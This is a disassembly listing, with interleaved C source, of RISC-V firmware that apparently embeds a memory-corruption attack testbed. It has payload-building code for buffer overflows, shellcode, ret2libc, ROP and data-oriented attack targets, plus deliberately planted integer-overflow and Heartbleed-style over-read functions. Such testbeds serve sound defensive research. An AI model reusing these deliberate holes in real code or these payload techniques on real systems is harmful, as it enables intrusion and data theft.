80041fd0:	188000ef          	jal	ra,80042158 <_getpid_r>
80041fd4:	00050593          	mv	a1,a0
80041fd8:	00040513          	mv	a0,s0
80041fdc:	01812403          	lw	s0,24(sp)
80041fe0:	00c12603          	lw	a2,12(sp)
80041fe4:	01c12083          	lw	ra,28(sp)
80041fe8:	02010113          	addi	sp,sp,32
80041fec:	11c0006f          	j	80042108 <_kill_r>
80041ff0:	00100693          	li	a3,1
80041ff4:	00000513          	li	a0,0
80041ff8:	00d70c63          	beq	a4,a3,80042010 <_raise_r+0x8c>
80041ffc:	fff00693          	li	a3,-1
80042000:	02d71063          	bne	a4,a3,80042020 <_raise_r+0x9c>
80042004:	01600793          	li	a5,22
80042008:	00f42023          	sw	a5,0(s0)
8004200c:	00100513          	li	a0,1
80042010:	01c12083          	lw	ra,28(sp)
80042014:	01812403          	lw	s0,24(sp)
80042018:	02010113          	addi	sp,sp,32
8004201c:	00008067          	ret
80042020:	00058513          	mv	a0,a1
80042024:	0007a023          	sw	zero,0(a5)
80042028:	000700e7          	jalr	a4
8004202c:	00000513          	li	a0,0
80042030:	fe1ff06f          	j	80042010 <_raise_r+0x8c>

80042034 <__sigtramp_r>:
80042034:	01f00793          	li	a5,31
80042038:	00b7f663          	bgeu	a5,a1,80042044 <__sigtramp_r+0x10>
8004203c:	fff00513          	li	a0,-1
80042040:	00008067          	ret
80042044:	14852783          	lw	a5,328(a0)
80042048:	ff010113          	addi	sp,sp,-16
8004204c:	00812423          	sw	s0,8(sp)
80042050:	00912223          	sw	s1,4(sp)
80042054:	00112623          	sw	ra,12(sp)
80042058:	00050493          	mv	s1,a0
8004205c:	00058413          	mv	s0,a1
80042060:	04078463          	beqz	a5,800420a8 <__sigtramp_r+0x74>
80042064:	1484a783          	lw	a5,328(s1)
80042068:	00241713          	slli	a4,s0,0x2
8004206c:	00100513          	li	a0,1
80042070:	00e78733          	add	a4,a5,a4
80042074:	00072783          	lw	a5,0(a4)
80042078:	02078e63          	beqz	a5,800420b4 <__sigtramp_r+0x80>
8004207c:	fff00693          	li	a3,-1
80042080:	00200513          	li	a0,2
80042084:	02d78863          	beq	a5,a3,800420b4 <__sigtramp_r+0x80>
80042088:	00100693          	li	a3,1
8004208c:	00300513          	li	a0,3
80042090:	02d78263          	beq	a5,a3,800420b4 <__sigtramp_r+0x80>
80042094:	00040513          	mv	a0,s0
80042098:	00072023          	sw	zero,0(a4)
8004209c:	000780e7          	jalr	a5
800420a0:	00000513          	li	a0,0
800420a4:	0100006f          	j	800420b4 <__sigtramp_r+0x80>
800420a8:	e05ff0ef          	jal	ra,80041eac <_init_signal_r>
800420ac:	fa050ce3          	beqz	a0,80042064 <__sigtramp_r+0x30>
800420b0:	fff00513          	li	a0,-1
800420b4:	00c12083          	lw	ra,12(sp)
800420b8:	00812403          	lw	s0,8(sp)
800420bc:	00412483          	lw	s1,4(sp)
800420c0:	01010113          	addi	sp,sp,16
800420c4:	00008067          	ret

800420c8 <raise>:
800420c8:	800477b7          	lui	a5,0x80047
800420cc:	00050593          	mv	a1,a0
800420d0:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
800420d4:	eb1ff06f          	j	80041f84 <_raise_r>

800420d8 <signal>:
800420d8:	800477b7          	lui	a5,0x80047
800420dc:	00058613          	mv	a2,a1
800420e0:	00050593          	mv	a1,a0
800420e4:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
800420e8:	e25ff06f          	j	80041f0c <_signal_r>

800420ec <_init_signal>:
800420ec:	800477b7          	lui	a5,0x80047
800420f0:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
800420f4:	db9ff06f          	j	80041eac <_init_signal_r>

800420f8 <__sigtramp>:
800420f8:	800477b7          	lui	a5,0x80047
800420fc:	00050593          	mv	a1,a0
80042100:	d307a503          	lw	a0,-720(a5) # 80046d30 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d31>
80042104:	f31ff06f          	j	80042034 <__sigtramp_r>

80042108 <_kill_r>:
80042108:	ff010113          	addi	sp,sp,-16
8004210c:	00812423          	sw	s0,8(sp)
80042110:	00912223          	sw	s1,4(sp)
80042114:	80047437          	lui	s0,0x80047
80042118:	00050493          	mv	s1,a0
8004211c:	00058513          	mv	a0,a1
80042120:	00060593          	mv	a1,a2
80042124:	00112623          	sw	ra,12(sp)
80042128:	26042a23          	sw	zero,628(s0) # 80047274 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047275>
8004212c:	21e020ef          	jal	ra,8004434a <_kill>
80042130:	fff00793          	li	a5,-1
80042134:	00f51863          	bne	a0,a5,80042144 <_kill_r+0x3c>
80042138:	27442783          	lw	a5,628(s0)
8004213c:	00078463          	beqz	a5,80042144 <_kill_r+0x3c>
80042140:	00f4a023          	sw	a5,0(s1)
80042144:	00c12083          	lw	ra,12(sp)
80042148:	00812403          	lw	s0,8(sp)
8004214c:	00412483          	lw	s1,4(sp)
80042150:	01010113          	addi	sp,sp,16
80042154:	00008067          	ret

80042158 <_getpid_r>:
80042158:	1f60206f          	j	8004434e <_getpid>

8004215c <memchr>:
8004215c:	0ff5f593          	andi	a1,a1,255
80042160:	00c50633          	add	a2,a0,a2
80042164:	00c51663          	bne	a0,a2,80042170 <memchr+0x14>
80042168:	00000513          	li	a0,0
8004216c:	00008067          	ret
80042170:	00054783          	lbu	a5,0(a0)
80042174:	feb78ce3          	beq	a5,a1,8004216c <memchr+0x10>
80042178:	00150513          	addi	a0,a0,1
8004217c:	fe9ff06f          	j	80042164 <memchr+0x8>

80042180 <memmove>:
80042180:	04a5fa63          	bgeu	a1,a0,800421d4 <memmove+0x54>
80042184:	00c586b3          	add	a3,a1,a2
80042188:	04d57663          	bgeu	a0,a3,800421d4 <memmove+0x54>
8004218c:	fff64593          	not	a1,a2
80042190:	00000793          	li	a5,0
80042194:	fff78793          	addi	a5,a5,-1
80042198:	00f59463          	bne	a1,a5,800421a0 <memmove+0x20>
8004219c:	00008067          	ret
800421a0:	00f68733          	add	a4,a3,a5
800421a4:	00074803          	lbu	a6,0(a4)
800421a8:	00c78733          	add	a4,a5,a2
800421ac:	00e50733          	add	a4,a0,a4
800421b0:	01070023          	sb	a6,0(a4)
800421b4:	fe1ff06f          	j	80042194 <memmove+0x14>
800421b8:	00f58733          	add	a4,a1,a5
800421bc:	00074683          	lbu	a3,0(a4)
800421c0:	00f50733          	add	a4,a0,a5
800421c4:	00178793          	addi	a5,a5,1
800421c8:	00d70023          	sb	a3,0(a4)
800421cc:	fef616e3          	bne	a2,a5,800421b8 <memmove+0x38>
800421d0:	00008067          	ret
800421d4:	00000793          	li	a5,0
800421d8:	ff5ff06f          	j	800421cc <memmove+0x4c>

800421dc <_realloc_r>:
800421dc:	00059663          	bnez	a1,800421e8 <_realloc_r+0xc>
800421e0:	00060593          	mv	a1,a2
800421e4:	f8cfe06f          	j	80040970 <_malloc_r>
800421e8:	fe010113          	addi	sp,sp,-32
800421ec:	00812c23          	sw	s0,24(sp)
800421f0:	00112e23          	sw	ra,28(sp)
800421f4:	00912a23          	sw	s1,20(sp)
800421f8:	01212823          	sw	s2,16(sp)
800421fc:	01312623          	sw	s3,12(sp)
80042200:	00060413          	mv	s0,a2
80042204:	02061663          	bnez	a2,80042230 <_realloc_r+0x54>
80042208:	e5cfe0ef          	jal	ra,80040864 <_free_r>
8004220c:	00000913          	li	s2,0
80042210:	01c12083          	lw	ra,28(sp)
80042214:	01812403          	lw	s0,24(sp)
80042218:	00090513          	mv	a0,s2
8004221c:	01412483          	lw	s1,20(sp)
80042220:	01012903          	lw	s2,16(sp)
80042224:	00c12983          	lw	s3,12(sp)
80042228:	02010113          	addi	sp,sp,32
8004222c:	00008067          	ret
80042230:	00058493          	mv	s1,a1
80042234:	00050993          	mv	s3,a0
80042238:	03c000ef          	jal	ra,80042274 <_malloc_usable_size_r>
8004223c:	00048913          	mv	s2,s1
80042240:	fc8578e3          	bgeu	a0,s0,80042210 <_realloc_r+0x34>
80042244:	00040593          	mv	a1,s0
80042248:	00098513          	mv	a0,s3
8004224c:	f24fe0ef          	jal	ra,80040970 <_malloc_r>
80042250:	00050913          	mv	s2,a0
80042254:	fa050ee3          	beqz	a0,80042210 <_realloc_r+0x34>
80042258:	00048593          	mv	a1,s1
8004225c:	00040613          	mv	a2,s0
80042260:	c50fe0ef          	jal	ra,800406b0 <memcpy>
80042264:	00048593          	mv	a1,s1
80042268:	00098513          	mv	a0,s3
8004226c:	df8fe0ef          	jal	ra,80040864 <_free_r>
80042270:	fa1ff06f          	j	80042210 <_realloc_r+0x34>

80042274 <_malloc_usable_size_r>:
80042274:	ffc5a783          	lw	a5,-4(a1)
80042278:	ffc78513          	addi	a0,a5,-4
8004227c:	0007d863          	bgez	a5,8004228c <_malloc_usable_size_r+0x18>
80042280:	00a585b3          	add	a1,a1,a0
80042284:	0005a783          	lw	a5,0(a1)
80042288:	00f50533          	add	a0,a0,a5
8004228c:	00008067          	ret

80042290 <__initialize>:
 * the C domain
 */
SECTION_FUNC(TEXT, __initialize)
#ifdef CONFIG_INIT_STACKS
	/* Pre-populate all bytes in _interrupt_stack with 0xAA */
	la t0, _interrupt_stack
80042290:	00006297          	auipc	t0,0x6
80042294:	3f028293          	addi	t0,t0,1008 # 80048680 <_interrupt_stack>
	li t1, CONFIG_ISR_STACK_SIZE
80042298:	6305                	lui	t1,0x1
	add t1, t1, t0
8004229a:	9316                	add	t1,t1,t0

	/* Populate _interrupt_stack with 0xaaaaaaaa */
	li t2, 0xaaaaaaaa
8004229c:	aaaab3b7          	lui	t2,0xaaaab
800422a0:	aaa38393          	addi	t2,t2,-1366 # aaaaaaaa <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0xaaaaaaab>

800422a4 <aa_loop>:
aa_loop:
	sw t2, 0x00(t0)
800422a4:	0072a023          	sw	t2,0(t0)
	addi t0, t0, 4
800422a8:	0291                	addi	t0,t0,4
	blt t0, t1, aa_loop
800422aa:	fe62cde3          	blt	t0,t1,800422a4 <aa_loop>

	/*
	 * Initially, setup stack pointer to
	 * _interrupt_stack + CONFIG_ISR_STACK_SIZE
	 */
	la sp, _interrupt_stack
800422ae:	00006117          	auipc	sp,0x6
800422b2:	3d210113          	addi	sp,sp,978 # 80048680 <_interrupt_stack>
	li t0, CONFIG_ISR_STACK_SIZE
800422b6:	6285                	lui	t0,0x1
	add sp, sp, t0
800422b8:	9116                	add	sp,sp,t0

	/*
	 * Jump into C domain. _PrepC zeroes BSS, copies rw data into RAM,
	 * and then enters kernel z_cstart
	 */
	call _PrepC
800422ba:	7cc010ef          	jal	ra,80043a86 <_PrepC>
	...

800422c0 <z_thread_entry_wrapper>:
	 * in registers a0, a1, a2 and a3. These registers are used as arguments
	 * to function z_thread_entry. Hence, just call z_thread_entry with
	 * return address set to 0 to indicate a non-returning function call.
	 */

	jal x0, z_thread_entry
800422c0:	1670106f          	j	80043c26 <z_thread_entry>
	...

800422c6 <dummy_function>:
void set_inject_param(char *choice);
void set_code_ptr(char *choice);
void set_location(char *choice);
void set_function(char *choice);

int dummy_function(const char *str) {
800422c6:	1141                	addi	sp,sp,-16
800422c8:	c606                	sw	ra,12(sp)
        printf("Dummy function\n");
800422ca:	80045537          	lui	a0,0x80045
800422ce:	64c50513          	addi	a0,a0,1612 # 8004564c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004564d>
800422d2:	5cb010ef          	jal	ra,8004409c <printk>
        return 0;
}
800422d6:	4501                	li	a0,0
800422d8:	40b2                	lw	ra,12(sp)
800422da:	0141                	addi	sp,sp,16
800422dc:	8082                	ret

800422de <shellcode_target>:
    }
}

void
shellcode_target()
{
800422de:	1141                	addi	sp,sp,-16
800422e0:	c606                	sw	ra,12(sp)
    printf("success.\nCode injection function reached.\n");
800422e2:	80046537          	lui	a0,0x80046
800422e6:	cc050513          	addi	a0,a0,-832 # 80045cc0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045cc1>
800422ea:	5b3010ef          	jal	ra,8004409c <printk>
    exit(0);
800422ee:	4501                	li	a0,0
800422f0:	b5cfe0ef          	jal	ra,8004064c <exit>

800422f4 <ret2libc_target>:
}

void
ret2libc_target()
{
800422f4:	1141                	addi	sp,sp,-16
800422f6:	c606                	sw	ra,12(sp)
    printf("success.\nRet2Libc function reached.\n");
800422f8:	80046537          	lui	a0,0x80046
800422fc:	c6050513          	addi	a0,a0,-928 # 80045c60 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045c61>
80042300:	59d010ef          	jal	ra,8004409c <printk>
    exit(0);
80042304:	4501                	li	a0,0
80042306:	b46fe0ef          	jal	ra,8004064c <exit>

8004230a <rop_target>:
    }
}

void
rop_target()
{
8004230a:	1141                	addi	sp,sp,-16
8004230c:	c606                	sw	ra,12(sp)
    printf("success.\nROP function reached.\n");
8004230e:	80046537          	lui	a0,0x80046
80042312:	c8850513          	addi	a0,a0,-888 # 80045c88 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045c89>
80042316:	587010ef          	jal	ra,8004409c <printk>
    exit(0);
8004231a:	4501                	li	a0,0
8004231c:	b30fe0ef          	jal	ra,8004064c <exit>

80042320 <hex_to_bin>:
void build_shellcode(char *shellcode);
void hex_to_string(char *str, size_t val);
void format_instruction(char *dest, size_t insn);

const char *hex_to_bin(char c) {
	if (c >= '0' && c <= '9') return bin4b[c - '0'];
80042320:	fd050793          	addi	a5,a0,-48
80042324:	0ff7f793          	andi	a5,a5,255
80042328:	4725                	li	a4,9
8004232a:	02f77363          	bgeu	a4,a5,80042350 <hex_to_bin+0x30>
	if (c >= 'a' && c <= 'f') return bin4b[10 + c - 'a'];
8004232e:	f9f50793          	addi	a5,a0,-97
80042332:	0ff7f793          	andi	a5,a5,255
80042336:	4715                	li	a4,5
80042338:	02f76663          	bltu	a4,a5,80042364 <hex_to_bin+0x44>
8004233c:	fa950513          	addi	a0,a0,-87
80042340:	050a                	slli	a0,a0,0x2
80042342:	800477b7          	lui	a5,0x80047
80042346:	8a878793          	addi	a5,a5,-1880 # 800468a8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800468a9>
8004234a:	953e                	add	a0,a0,a5
8004234c:	4108                	lw	a0,0(a0)
8004234e:	8082                	ret
	if (c >= '0' && c <= '9') return bin4b[c - '0'];
80042350:	fd050513          	addi	a0,a0,-48
80042354:	050a                	slli	a0,a0,0x2
80042356:	800477b7          	lui	a5,0x80047
8004235a:	8a878793          	addi	a5,a5,-1880 # 800468a8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800468a9>
8004235e:	953e                	add	a0,a0,a5
80042360:	4108                	lw	a0,0(a0)
80042362:	8082                	ret
	return NULL;
80042364:	4501                	li	a0,0
}
80042366:	8082                	ret

80042368 <build_payload>:
{
80042368:	1141                	addi	sp,sp,-16
8004236a:	c606                	sw	ra,12(sp)
8004236c:	c422                	sw	s0,8(sp)
8004236e:	c226                	sw	s1,4(sp)
80042370:	c04a                	sw	s2,0(sp)
	switch (attack.inject_param) {
80042372:	800477b7          	lui	a5,0x80047
80042376:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004237a:	43dc                	lw	a5,4(a5)
8004237c:	0ca00713          	li	a4,202
80042380:	02f76463          	bltu	a4,a5,800423a8 <build_payload+0x40>
80042384:	0c900713          	li	a4,201
80042388:	04e7f163          	bgeu	a5,a4,800423ca <build_payload+0x62>
8004238c:	0c800713          	li	a4,200
80042390:	04e79663          	bne	a5,a4,800423dc <build_payload+0x74>
            if (payload->size < (size_shellcode_nonop + sizeof(long))) {
80042394:	4158                	lw	a4,4(a0)
80042396:	47bd                	li	a5,15
80042398:	12e7f863          	bgeu	a5,a4,800424c8 <build_payload+0x160>
            shellcode      = shellcode_nonop;
8004239c:	800474b7          	lui	s1,0x80047
800423a0:	13848493          	addi	s1,s1,312 # 80047138 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047139>
            size_shellcode = size_shellcode_nonop;
800423a4:	4931                	li	s2,12
800423a6:	a81d                	j	800423dc <build_payload+0x74>
	switch (attack.inject_param) {
800423a8:	0cb00713          	li	a4,203
800423ac:	02e79863          	bne	a5,a4,800423dc <build_payload+0x74>
            if (attack.code_ptr == VAR_IOF)
800423b0:	800477b7          	lui	a5,0x80047
800423b4:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
800423b8:	479c                	lw	a5,8(a5)
800423ba:	13c00713          	li	a4,316
800423be:	0ce78263          	beq	a5,a4,80042482 <build_payload+0x11a>
			if (attack.code_ptr == VAR_LEAK) {
800423c2:	13d00713          	li	a4,317
800423c6:	0ce78263          	beq	a5,a4,8004248a <build_payload+0x122>
            if (payload->size < sizeof(long))
800423ca:	4158                	lw	a4,4(a0)
800423cc:	478d                	li	a5,3
800423ce:	0ee7ff63          	bgeu	a5,a4,800424cc <build_payload+0x164>
            shellcode      = "dummy";
800423d2:	800454b7          	lui	s1,0x80045
800423d6:	4e448493          	addi	s1,s1,1252 # 800454e4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800454e5>
            size_shellcode = 0;
800423da:	4901                	li	s2,0
800423dc:	842a                	mv	s0,a0
    payload->buffer = (char *) malloc(payload->size);
800423de:	4148                	lw	a0,4(a0)
800423e0:	ab0fe0ef          	jal	ra,80040690 <malloc>
800423e4:	c448                	sw	a0,12(s0)
    if (payload->buffer == NULL) {
800423e6:	c969                	beqz	a0,800424b8 <build_payload+0x150>
__ ## fun ## _ichk(type1 __restrict dst, type2 __restrict src) { \
	return __builtin___ ## fun ## _chk(dst, src, __ssp_bos0(dst)); \
}

__BEGIN_DECLS
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
800423e8:	864a                	mv	a2,s2
800423ea:	85a6                	mv	a1,s1
800423ec:	ac4fe0ef          	jal	ra,800406b0 <memcpy>
      (payload->size - size_shellcode - sizeof(long) - sizeof(char));
800423f0:	4044                	lw	s1,4(s0)
800423f2:	412484b3          	sub	s1,s1,s2
    bytes_to_pad =
800423f6:	14ed                	addi	s1,s1,-5
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);
800423f8:	4448                	lw	a0,12(s0)
__ssp_bos_icheck3(memmove, void *, const void *)
__ssp_bos_icheck3_restrict(mempcpy, void *, const void *)
__ssp_bos_icheck3(memset, void *, int)
800423fa:	8626                	mv	a2,s1
800423fc:	04100593          	li	a1,65
80042400:	954a                	add	a0,a0,s2
80042402:	b86fe0ef          	jal	ra,80040788 <memset>
        fprintf(stderr, "bytes to pad: %d\n", bytes_to_pad);
80042406:	85a6                	mv	a1,s1
80042408:	80045537          	lui	a0,0x80045
8004240c:	51050513          	addi	a0,a0,1296 # 80045510 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045511>
80042410:	48d010ef          	jal	ra,8004409c <printk>
        fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
80042414:	440c                	lw	a1,8(s0)
80042416:	80045537          	lui	a0,0x80045
8004241a:	52450513          	addi	a0,a0,1316 # 80045524 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045525>
8004241e:	47f010ef          	jal	ra,8004409c <printk>
    if (attack.code_ptr != VAR_IOF) {
80042422:	800477b7          	lui	a5,0x80047
80042426:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
8004242a:	4798                	lw	a4,8(a5)
8004242c:	13c00793          	li	a5,316
80042430:	02f70563          	beq	a4,a5,8004245a <build_payload+0xf2>
        memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
80042434:	445c                	lw	a5,12(s0)
80042436:	94ca                	add	s1,s1,s2
80042438:	94be                	add	s1,s1,a5
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
8004243a:	00844603          	lbu	a2,8(s0)
8004243e:	00944683          	lbu	a3,9(s0)
80042442:	00a44703          	lbu	a4,10(s0)
80042446:	00b44783          	lbu	a5,11(s0)
8004244a:	00c48023          	sb	a2,0(s1)
8004244e:	00d480a3          	sb	a3,1(s1)
80042452:	00e48123          	sb	a4,2(s1)
80042456:	00f481a3          	sb	a5,3(s1)
    memset((payload->buffer + payload->size - 1), '\0', 1);
8004245a:	445c                	lw	a5,12(s0)
8004245c:	4058                	lw	a4,4(s0)
8004245e:	177d                	addi	a4,a4,-1
80042460:	97ba                	add	a5,a5,a4
__ssp_bos_icheck3(memset, void *, int)
80042462:	00078023          	sb	zero,0(a5)
        fprintf(stderr, "payload: %s\n", payload->buffer);
80042466:	444c                	lw	a1,12(s0)
80042468:	80045537          	lui	a0,0x80045
8004246c:	53850513          	addi	a0,a0,1336 # 80045538 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045539>
80042470:	42d010ef          	jal	ra,8004409c <printk>
    return TRUE;
80042474:	4505                	li	a0,1
} /* build_payload */
80042476:	40b2                	lw	ra,12(sp)
80042478:	4422                	lw	s0,8(sp)
8004247a:	4492                	lw	s1,4(sp)
8004247c:	4902                	lw	s2,0(sp)
8004247e:	0141                	addi	sp,sp,16
80042480:	8082                	ret
                payload->size = 256 + sizeof(long) + sizeof(char);
80042482:	10500713          	li	a4,261
80042486:	c158                	sw	a4,4(a0)
80042488:	bf2d                	j	800423c2 <build_payload+0x5a>
				payload->size += 32 - sizeof(long);
8004248a:	415c                	lw	a5,4(a0)
8004248c:	07f1                	addi	a5,a5,28
8004248e:	c15c                	sw	a5,4(a0)
				payload->buffer[0] = payload->size & 0xFF;
80042490:	4558                	lw	a4,12(a0)
80042492:	00f70023          	sb	a5,0(a4)
				payload->buffer[1] = payload->size / 0x100;
80042496:	415c                	lw	a5,4(a0)
80042498:	83a1                	srli	a5,a5,0x8
8004249a:	4558                	lw	a4,12(a0)
8004249c:	00f700a3          	sb	a5,1(a4)
				payload->buffer[2] = 'A';
800424a0:	455c                	lw	a5,12(a0)
800424a2:	04100713          	li	a4,65
800424a6:	00e78123          	sb	a4,2(a5)
				payload->buffer[3] = '\0';
800424aa:	455c                	lw	a5,12(a0)
800424ac:	000781a3          	sb	zero,3(a5)
				payload->size = 4;
800424b0:	4791                	li	a5,4
800424b2:	c15c                	sw	a5,4(a0)
				return TRUE;
800424b4:	4505                	li	a0,1
800424b6:	b7c1                	j	80042476 <build_payload+0x10e>
            printk("Unable to allocate payload buffer.");
800424b8:	80045537          	lui	a0,0x80045
800424bc:	4ec50513          	addi	a0,a0,1260 # 800454ec <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800454ed>
800424c0:	3dd010ef          	jal	ra,8004409c <printk>
        return FALSE;
800424c4:	4501                	li	a0,0
800424c6:	bf45                	j	80042476 <build_payload+0x10e>
                return FALSE;
800424c8:	4501                	li	a0,0
800424ca:	b775                	j	80042476 <build_payload+0x10e>
                return FALSE;
800424cc:	4501                	li	a0,0
800424ce:	b765                	j	80042476 <build_payload+0x10e>

800424d0 <lj_func>:
{
800424d0:	1141                	addi	sp,sp,-16
800424d2:	c606                	sw	ra,12(sp)
    longjmp(lj_buf, 1111);
800424d4:	45700593          	li	a1,1111
800424d8:	e74fe0ef          	jal	ra,80040b4c <longjmp>

800424dc <homebrew_memcpy>:
    while (length--) {
800424dc:	fff60793          	addi	a5,a2,-1
800424e0:	ca09                	beqz	a2,800424f2 <homebrew_memcpy+0x16>
        *d++ = *s++;
800424e2:	0005c703          	lbu	a4,0(a1)
800424e6:	00e50023          	sb	a4,0(a0)
800424ea:	0585                	addi	a1,a1,1
800424ec:	0505                	addi	a0,a0,1
    while (length--) {
800424ee:	863e                	mv	a2,a5
800424f0:	b7f5                	j	800424dc <homebrew_memcpy>
}
800424f2:	8082                	ret

800424f4 <set_low_buf>:
}

void
set_low_buf(char ** buf)
{
800424f4:	bf010113          	addi	sp,sp,-1040
800424f8:	40112623          	sw	ra,1036(sp)
800424fc:	40812423          	sw	s0,1032(sp)
80042500:	842a                	mv	s0,a0
    char low_buf[1024];

    if (output_debug_info)
        fprintf(stderr, "Inside set_low_buf()\n");
80042502:	80046537          	lui	a0,0x80046
80042506:	ca850513          	addi	a0,a0,-856 # 80045ca8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045ca9>
8004250a:	393010ef          	jal	ra,8004409c <printk>
    *buf = &low_buf;
8004250e:	00242023          	sw	sp,0(s0)
}
80042512:	40c12083          	lw	ra,1036(sp)
80042516:	40812403          	lw	s0,1032(sp)
8004251a:	41010113          	addi	sp,sp,1040
8004251e:	8082                	ret

80042520 <iof>:

void
iof(char * buf, uint32_t iv)
{
80042520:	1141                	addi	sp,sp,-16
80042522:	c606                	sw	ra,12(sp)
80042524:	c422                	sw	s0,8(sp)
80042526:	c226                	sw	s1,4(sp)
80042528:	84ae                	mv	s1,a1
    char * map;
    uint32_t key = iv;
    uint8_t len  = strlen(buf);
8004252a:	a4ffe0ef          	jal	ra,80040f78 <strlen>

    // 0-length allocation and vulenrable hash operations
    map      = (char *) malloc(len * sizeof(char));
8004252e:	0ff57413          	andi	s0,a0,255
80042532:	8522                	mv	a0,s0
80042534:	95cfe0ef          	jal	ra,80040690 <malloc>
    key     -= (uint32_t) map;
80042538:	8c89                	sub	s1,s1,a0
    key     &= (uint16_t) len - 1;
8004253a:	147d                	addi	s0,s0,-1
8004253c:	8c65                	and	s0,s0,s1
    map[key] = 0xa1;
8004253e:	942a                	add	s0,s0,a0
80042540:	fa100793          	li	a5,-95
80042544:	00f40023          	sb	a5,0(s0)
}
80042548:	40b2                	lw	ra,12(sp)
8004254a:	4422                	lw	s0,8(sp)
8004254c:	4492                	lw	s1,4(sp)
8004254e:	0141                	addi	sp,sp,16
80042550:	8082                	ret

80042552 <dop_target>:
{
80042552:	1101                	addi	sp,sp,-32
80042554:	ce06                	sw	ra,28(sp)
    size_t auth_loc = auth;
80042556:	c62e                	sw	a1,12(sp)
    if (attack.code_ptr == VAR_IOF) {
80042558:	800477b7          	lui	a5,0x80047
8004255c:	f0078793          	addi	a5,a5,-256 # 80046f00 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046f01>
80042560:	4798                	lw	a4,8(a5)
80042562:	13c00793          	li	a5,316
80042566:	00f70d63          	beq	a4,a5,80042580 <dop_target+0x2e>
    if (!auth_loc) {
8004256a:	47b2                	lw	a5,12(sp)
8004256c:	ef89                	bnez	a5,80042586 <dop_target+0x34>
        printf("DOP attack failed\n");
8004256e:	80045537          	lui	a0,0x80045
80042572:	60c50513          	addi	a0,a0,1548 # 8004560c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004560d>
80042576:	327010ef          	jal	ra,8004409c <printk>
}
8004257a:	40f2                	lw	ra,28(sp)
8004257c:	6105                	addi	sp,sp,32
8004257e:	8082                	ret
        iof(buf, &auth_loc);
80042580:	006c                	addi	a1,sp,12
80042582:	3f79                	jal	80042520 <iof>
80042584:	b7dd                	j	8004256a <dop_target+0x18>
        printf("success.\nDOP memory corruption reached.\n");
80042586:	80045537          	lui	a0,0x80045
8004258a:	62050513          	addi	a0,a0,1568 # 80045620 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045621>
8004258e:	30f010ef          	jal	ra,8004409c <printk>
        exit(0);
80042592:	4501                	li	a0,0
80042594:	8b8fe0ef          	jal	ra,8004064c <exit>

80042598 <data_leak>:

void
data_leak(char *buf) {
80042598:	1141                	addi	sp,sp,-16
8004259a:	c606                	sw	ra,12(sp)
8004259c:	c422                	sw	s0,8(sp)
8004259e:	c226                	sw	s1,4(sp)
800425a0:	c04a                	sw	s2,0(sp)
800425a2:	842a                	mv	s0,a0
	uint16_t size = buf[0] + (buf[1] * 0x100), i;
800425a4:	00054483          	lbu	s1,0(a0)
800425a8:	00154783          	lbu	a5,1(a0)
800425ac:	07a2                	slli	a5,a5,0x8
800425ae:	94be                	add	s1,s1,a5
800425b0:	04c2                	slli	s1,s1,0x10
800425b2:	80c1                	srli	s1,s1,0x10
	char *msg = (char *)malloc(size);
800425b4:	8526                	mv	a0,s1
800425b6:	8dafe0ef          	jal	ra,80040690 <malloc>
800425ba:	892a                	mv	s2,a0
__ssp_bos_icheck3_restrict(memcpy, void *, const void *)
800425bc:	8626                	mv	a2,s1
800425be:	00240593          	addi	a1,s0,2
800425c2:	8eefe0ef          	jal	ra,800406b0 <memcpy>
800425c6:	4401                	li	s0,0
800425c8:	a811                	j	800425dc <data_leak+0x44>

	memcpy(msg, buf + 2, size);
	for (i = 0; i < size; i++) {
		if (msg[i] >= 0x20) printf("%c",msg[i]);
800425ca:	80045537          	lui	a0,0x80045
800425ce:	60850513          	addi	a0,a0,1544 # 80045608 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80045609>
800425d2:	2cb010ef          	jal	ra,8004409c <printk>
	for (i = 0; i < size; i++) {
800425d6:	0405                	addi	s0,s0,1
800425d8:	0442                	slli	s0,s0,0x10
800425da:	8041                	srli	s0,s0,0x10
800425dc:	00947a63          	bgeu	s0,s1,800425f0 <data_leak+0x58>
		if (msg[i] >= 0x20) printf("%c",msg[i]);
800425e0:	008907b3          	add	a5,s2,s0
800425e4:	0007c583          	lbu	a1,0(a5)
800425e8:	47fd                	li	a5,31
800425ea:	feb7f6e3          	bgeu	a5,a1,800425d6 <data_leak+0x3e>
800425ee:	bff1                	j	800425ca <data_leak+0x32>
	}

	printf("\n");
